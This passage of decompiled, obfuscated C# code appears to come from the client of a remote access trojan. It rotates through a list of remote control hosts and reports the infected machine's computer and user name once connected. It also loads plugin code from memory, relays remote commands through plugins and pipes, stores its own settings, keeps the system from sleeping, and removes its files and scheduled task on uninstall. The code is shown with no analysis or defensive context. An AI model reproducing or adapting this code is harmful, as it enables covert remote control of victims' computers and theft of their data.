    lock (Class8.list_3)
    {
      Class8.smethod_87("Rebuilding host cache..");
      Class8.int_0 = 0;
      Class8.int_1 = 0;
      Class8.list_3.Clear();
      Class8.smethod_64(Class24.smethod_4());
      Class8.smethod_64(Class24.smethod_5());
      if (Class8.byte_1 != null)
        Class8.smethod_68();
      int num = Class8.list_3.Count - 1;
      for (int index = 0; index <= num; ++index)
        Class8.smethod_87(string.Format("Host: {0}", (object) Class8.list_3[index]));
    }
  }

  public static void smethod_64(string string_4)
  {
    lock (Class8.list_3)
    {
      if (string.IsNullOrEmpty(string_4))
        return;
      string str1 = string_4.Replace("*", string.Empty);
      if (!Class8.list_3.Contains(str1))
        Class8.list_3.Add(str1);
      int num = 0;
      do
      {
        string str2 = string_4.Replace("*", Conversions.ToString(num));
        if (!Class8.list_3.Contains(str2))
          goto label_6;
label_5:
        ++num;
        continue;
label_6:
        Class8.list_3.Add(str2);
        goto label_5;
      }
      while (num <= 9);
    }
  }

  public static string smethod_65()
  {
    lock (Class8.list_3)
      return Class8.list_3[Class8.int_0];
  }

  private static void smethod_66(string string_4)
  {
    if (Class8.list_2 == null)
      return;
    try
    {
      foreach (GClass2 gclass2 in Class8.list_2)
      {
        if (gclass2.gclass3_0 != null)
        {
          try
          {
            gclass2.gclass3_0.method_0(string_4);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception_0 = ex;
            Class8.smethod_85(gclass2.gclass3_0, exception_0, "VariableChanged");
            ProjectData.ClearProjectError();
          }
        }
      }
    }
    finally
    {
      List<GClass2>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private static void smethod_67(string string_4)
  {
    if (Class8.list_2 == null || !Class8.bool_0)
      return;
    Class8.bool_1 = true;
    try
    {
      foreach (GClass2 gclass2 in Class8.list_2)
      {
        if (gclass2.gclass3_0 != null)
        {
          try
          {
            gclass2.gclass3_0.method_1(string_4);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception_0 = ex;
            Class8.smethod_85(gclass2.gclass3_0, exception_0, "ClientSettingChanged");
            ProjectData.ClearProjectError();
          }
        }
      }
    }
    finally
    {
      List<GClass2>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private static void smethod_68()
  {
    try
    {
      foreach (GClass2 gclass2 in Class8.list_2)
      {
        if (gclass2.gclass3_0 != null)
        {
          try
          {
            gclass2.gclass3_0.method_2();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception_0 = ex;
            Class8.smethod_85(gclass2.gclass3_0, exception_0, "BuildingHostCache");
            ProjectData.ClearProjectError();
          }
        }
      }
    }
    finally
    {
      List<GClass2>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private static Assembly smethod_69(object object_0, ResolveEventArgs resolveEventArgs_0)
  {
    try
    {
      if (resolveEventArgs_0.Name.StartsWith("ClientPlugin"))
      {
        if ((object) Class8.assembly_0 == null)
          Class8.assembly_0 = Assembly.Load(Class8.byte_1);
        return Class8.assembly_0;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "AssemblyResolve");
      ProjectData.ClearProjectError();
    }
    return (Assembly) null;
  }

  private static void smethod_70(Client client_1, string string_4, IPAddress ipaddress_0) => Class8.smethod_87(string.Format("Resolved hostname '{0}' to '{1}'", (object) string_4, (object) ipaddress_0));

  private static void smethod_71(Client client_1)
  {
    if (Class8.list_2 != null)
    {
      try
      {
        foreach (GClass2 gclass2 in Class8.list_2)
        {
          if (gclass2.gclass3_0 != null)
          {
            try
            {
              gclass2.gclass3_0.method_3(client_1.method_33(), client_1.method_34());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              Exception exception_0 = ex;
              Class8.smethod_85(gclass2.gclass3_0, exception_0, "HostConnectFailed");
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      finally
      {
        List<GClass2>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    Class8.smethod_74(true);
  }

  private static void smethod_72(Client client_1, Exception exception_0) => Class8.smethod_86(exception_0, string.Empty);

  private static void smethod_73(Client client_1, bool bool_6)
  {
    if (bool_6)
    {
      Class8.bool_4 = true;
      Class8.dateTime_2 = DateTime.Now.AddMinutes(5.0);
      Class8.smethod_87("Connection established.");
      Class20.smethod_6(Class24.guid_0, Environment.MachineName + "\\" + Environment.UserName, Class24.smethod_3(), Class24.smethod_1());
    }
    else
    {
      Class8.smethod_74(false);
      Class8.dateTime_2 = DateTime.MaxValue;
    }
  }

  private static void smethod_74(bool bool_6)
  {
    ++Class8.int_1;
    if (Class8.int_1 == 3)
    {
      Class8.int_1 = 0;
      lock (Class8.list_3)
      {
        if (Class8.int_0 == Class8.list_3.Count - 1)
          Class8.smethod_63();
        else
          ++Class8.int_0;
      }
    }
    if (!bool_6)
      Class8.smethod_75(false);
    if (Class8.bool_4)
    {
      Class8.bool_4 = false;
      Class8.smethod_87("Disconnected from remote host.");
    }
    if (Class8.dictionary_2 != null)
    {
      if (Class8.dictionary_2.Count != 0)
        Class8.smethod_87(string.Format("Closing connection pipes..", (object) Class8.dictionary_2.Count));
      Dictionary<string, Client>.Enumerator enumerator = Class8.dictionary_2.GetEnumerator();
      while (enumerator.MoveNext())
        enumerator.Current.Value.method_56();
      Class8.dictionary_2.Clear();
    }
    ThreadPool.QueueUserWorkItem((WaitCallback) (object_0 => ((Delegate0) (() => Class8.smethod_43()))()));
  }

  public static void smethod_75(bool bool_6)
  {
    if (Class8.list_2 == null)
      return;
    try
    {
      foreach (GClass2 gclass2 in Class8.list_2)
      {
        if (gclass2.gclass3_0 != null)
        {
          try
          {
            gclass2.gclass3_0.method_4(bool_6);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception_0 = ex;
            Class8.smethod_85(gclass2.gclass3_0, exception_0, "HostStateChanged");
            ProjectData.ClearProjectError();
          }
        }
      }
    }
    finally
    {
      List<GClass2>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private static void smethod_76(Client client_1, byte[] byte_3)
  {
    GStruct2 gstruct2_0 = Class22.smethod_4(byte_3);
    switch (gstruct2_0.byte_0)
    {
      case 0:
        Class20.smethod_0(gstruct2_0);
        break;
      case 1:
        Class5.smethod_0(gstruct2_0);
        break;
      case 2:
        Class10.smethod_0(gstruct2_0);
        break;
    }
  }

  public static void smethod_77(Client client_1, byte[] byte_3)
  {
    GStruct2 gstruct2_0 = Class22.smethod_4(byte_3);
    GClass3 gclass30 = client_1.method_30().gclass3_0;
    try
    {
      if (gclass30 == null)
        Class8.smethod_84(client_1.method_30().string_0, gstruct2_0);
      else
        gclass30.method_7(client_1.method_30().string_0, gstruct2_0.object_0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      string string_4 = string.Format("ReadPacket [{0}]", (object) client_1.method_30().string_0);
      if (gclass30 == null)
        Class8.smethod_86(exception_0, string_4);
      else
        Class8.smethod_85(gclass30, exception_0, string_4);
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_78(Client client_1) => Class8.smethod_80(client_1);

  public static void smethod_79(Client client_1, bool bool_6)
  {
    GClass3 gclass30 = client_1.method_30().gclass3_0;
    if (bool_6)
    {
      Class8.smethod_88(client_1, true, CommandType.BaseCommand, (byte) 2, new object[2]
      {
        (object) client_1.method_30().string_0,
        (object) client_1.method_30().guid_0
      });
      try
      {
        if (gclass30 == null)
          Class8.smethod_82(client_1.method_30().string_0);
        else
          gclass30.method_5(client_1.method_30().string_0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception_0 = ex;
        string string_4 = string.Format("PipeCreated [{0}]", (object) client_1.method_30().string_0);
        if (gclass30 == null)
          Class8.smethod_86(exception_0, string_4);
        else
          Class8.smethod_85(gclass30, exception_0, string_4);
        ProjectData.ClearProjectError();
      }
    }
    else
      Class8.smethod_80(client_1);
  }

  public static void smethod_80(Client client_1)
  {
    GClass3 gclass30 = client_1.method_30().gclass3_0;
    try
    {
      if (gclass30 == null)
        Class8.smethod_83(client_1.method_30().string_0);
      else
        gclass30.method_6(client_1.method_30().string_0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      string string_4 = string.Format("PipeDestroyed [{0}]", (object) client_1.method_30().string_0);
      if (gclass30 == null)
        Class8.smethod_86(exception_0, string_4);
      else
        Class8.smethod_85(gclass30, exception_0, string_4);
      ProjectData.ClearProjectError();
    }
    if (!Class8.client_0.method_35())
      return;
    Class8.dictionary_2.Remove(client_1.method_30().string_0);
  }

  public static void smethod_81(Client client_1, Exception exception_0) => Class8.smethod_86(exception_0, string.Format("Pipe_ExceptionThrown [{0}]", (object) client_1.method_30().string_0));

  private static void smethod_82(string string_4)
  {
  }

  private static void smethod_83(string string_4)
  {
  }

  private static void smethod_84(string string_4, GStruct2 gstruct2_0)
  {
    if (Operators.CompareString(string_4, Class27.string_0, false) != 0)
      return;
    Class10.smethod_0(gstruct2_0);
  }

  public static void smethod_85(GClass3 gclass3_0, Exception exception_0, string string_4)
  {
    Class8.smethod_87(string.Empty);
    Class8.smethod_87(string.Format("Plugin Exception [{0}] ({1}):", (object) gclass3_0.string_0, (object) string_4));
    Class8.smethod_87(string.Format("{0} {1}", (object) exception_0.Message, (object) exception_0.StackTrace));
    Class8.smethod_87(string.Empty);
  }

  public static void smethod_86(Exception exception_0, string string_4)
  {
    Class8.smethod_87(string.Empty);
    Class8.smethod_87(string.Format("Client Exception ({0}):", (object) string_4));
    Class8.smethod_87(string.Format("{0} {1}", (object) exception_0.Message, (object) exception_0.StackTrace));
    Class8.smethod_87(string.Empty);
  }

  public static void smethod_87(string string_4)
  {
    if (!Class8.bool_3 && !Class8.bool_2)
      return;
    string_4 = string_4.Trim();
    int day1 = Class8.dateTime_1.Day;
    DateTime now = DateTime.Now;
    int day2 = now.Day;
    if (day1 != day2)
    {
      if (Class8.bool_3)
      {
        Class8.streamWriter_0.WriteLine();
        StreamWriter streamWriter0 = Class8.streamWriter_0;
        now = DateTime.Now;
        string longDateString = now.ToLongDateString();
        streamWriter0.WriteLine(longDateString);
        Class8.streamWriter_0.WriteLine();
      }
      if (Class8.bool_2)
      {
        Console.WriteLine();
        now = DateTime.Now;
        Console.WriteLine(now.ToLongDateString());
        Console.WriteLine();
      }
    }
    string str = string.Format("{0:t}: ", (object) DateTime.Now);
    if (Class8.bool_3)
    {
      Class8.streamWriter_0.Write(str);
      Class8.streamWriter_0.WriteLine(string_4);
    }
    if (Class8.bool_2)
    {
      Console.Write(str);
      Console.WriteLine(string_4);
    }
    Class8.dateTime_1 = DateTime.Now;
  }

  public static void smethod_88(
    Client client_1,
    bool bool_6,
    CommandType commandType_0,
    byte byte_3,
    object[] object_0)
  {
    Guid guid_0;
    byte[] byte_4 = Class22.smethod_3(bool_6, (byte) commandType_0, byte_3, guid_0, object_0);
    client_1.method_54(byte_4);
  }

  public static void smethod_89(
    Client client_1,
    bool bool_6,
    CommandType commandType_0,
    byte byte_3,
    Guid guid_0,
    object[] object_0)
  {
    byte[] byte_4 = Class22.smethod_3(bool_6, (byte) commandType_0, byte_3, guid_0, object_0);
    client_1.method_54(byte_4);
  }

  public static void smethod_90(
    string string_4,
    bool bool_6,
    CommandType commandType_0,
    byte byte_3,
    object[] object_0)
  {
    if (!Class8.dictionary_2.ContainsKey(string_4))
      return;
    Class8.smethod_88(Class8.dictionary_2[string_4], bool_6, commandType_0, byte_3, object_0);
  }

  public static void smethod_91()
  {
    try
    {
      foreach (GClass2 gclass2 in Class8.list_2)
      {
        if (gclass2.gclass3_0 != null)
        {
          try
          {
            gclass2.gclass3_0.method_9();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception_0 = ex;
            Class8.smethod_85(gclass2.gclass3_0, exception_0, "ClientUninstalling");
            ProjectData.ClearProjectError();
          }
        }
      }
    }
    finally
    {
      List<GClass2>.Enumerator enumerator;
      enumerator.Dispose();
    }
    Class8.bool_3 = false;
    try
    {
      if (Class8.streamWriter_0 != null)
        Class8.streamWriter_0.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    foreach (string file in Directory.GetFiles(Class24.string_0, "*", SearchOption.AllDirectories))
    {
      try
      {
        System.IO.File.Delete(file);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    try
    {
      Directory.Delete(Class24.string_0, true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Class8.smethod_53();
    Class8.smethod_55();
    Class8.smethod_49(Class24.string_2, 5000);
    Class8.smethod_49(Class24.string_2 + " Task", 5000);
  }

  public static void smethod_92()
  {
    try
    {
      Class8.bool_1 = false;
      Class8.smethod_87("Writing server settings..");
      List<object> objectList = new List<object>();
      foreach (KeyValuePair<string, object> entry in Class8.gclass6_1.GetEntries())
      {
        objectList.Add((object) entry.Key);
        objectList.Add(RuntimeHelpers.GetObjectValue(entry.Value));
        Class8.smethod_87(string.Format("{0} = {1}", (object) entry.Key, RuntimeHelpers.GetObjectValue(entry.Value)));
      }
      byte[] bytes = Class22.smethod_1(objectList.ToArray());
      string str1 = Path.Combine(Class24.string_0, "settings.bin");
      string str2 = Path.Combine(Class24.string_0, "settings.bak");
      if (System.IO.File.Exists(str1))
      {
        System.IO.File.Delete(str2);
        System.IO.File.Copy(str1, str2);
      }
      System.IO.File.WriteAllBytes(str1, bytes);
      System.IO.File.Delete(str2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "SaveSettings");
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_93(string string_4)
  {
    Class8.smethod_87(string.Format("Reading client settings from '{0}'..", (object) string_4));
    try
    {
      Class8.gclass6_1.method_0();
      object[] objArray = System.IO.File.Exists(Path.Combine(Class24.string_0, string_4)) ? Class22.smethod_2(System.IO.File.ReadAllBytes(Path.Combine(Class24.string_0, string_4))) : throw new Exception(string.Format("Settings file '{0}' could not be found.", (object) string_4));
      int num = objArray.Length - 1;
      for (int index = 0; index <= num; index += 2)
      {
        string string_0 = (string) objArray[index];
        object objectValue = RuntimeHelpers.GetObjectValue(objArray[index + 1]);
        Class8.gclass6_1.SetValue(string_0, RuntimeHelpers.GetObjectValue(objectValue));
        Class8.smethod_87(string.Format("{0} = {1}", (object) string_0, RuntimeHelpers.GetObjectValue(objectValue)));
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "LoadSettings");
      if (Operators.CompareString(string_4, "settings.bin", false) == 0)
        Class8.smethod_93("settings.bak");
      ProjectData.ClearProjectError();
    }
    Class8.bool_0 = true;
  }

  private static void smethod_94(object object_0)
  {
    DateTime now = DateTime.Now;
    if (Class8.bool_1)
      Class8.smethod_92();
    if (Class8.client_0 == null || !Class8.client_0.method_35())
      return;
    TimeSpan timeSpan = now - Class8.dateTime_3;
    if (timeSpan.TotalMilliseconds < (double) Class24.smethod_20())
      return;
    Class8.dateTime_3 = now;
    timeSpan = now - Class8.dateTime_2;
    if (timeSpan.TotalMilliseconds >= (double) Class24.smethod_21())
      Class8.client_0.method_56();
    else
      Class20.smethod_9();
  }

  private static void smethod_95()
  {
    Thread.Sleep(20000);
    uint uint_0 = 2147483649;
    if (Class24.smethod_15())
      uint_0 |= 64U;
    int num = (int) Class9.SetThreadExecutionState(uint_0);
    Class8.smethod_95();
  }
}
